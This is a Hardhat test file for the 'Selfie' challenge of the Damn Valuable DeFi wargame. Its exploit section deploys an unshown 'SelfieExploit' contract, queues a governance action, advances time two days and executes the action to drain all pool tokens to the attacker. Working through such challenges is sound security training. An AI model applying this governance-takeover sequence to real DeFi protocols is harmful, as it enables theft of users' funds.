const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const factory = await ethers.getContractFactory('SelfieExploit', attacker);
        const instance = await factory.deploy(
            this.governance.address, 
            this.pool.address, 
            this.token.address
        );
        //execute exploit and get actionId
        const tx = await instance.attack();
        const rc = await tx.wait();
        const event = rc.events.find(event => event.address === this.governance.address);
        const eventAbi = ["event ActionQueued(uint256 actionId, address indexed caller)"];
        let log = new ethers.utils.Interface(eventAbi).parseLog(event);
        const [actionId] = log.args;

        //wait 2 days
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
        
        //execute proposed action
        await this.governance.connect(attacker).executeAction(actionId);         
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
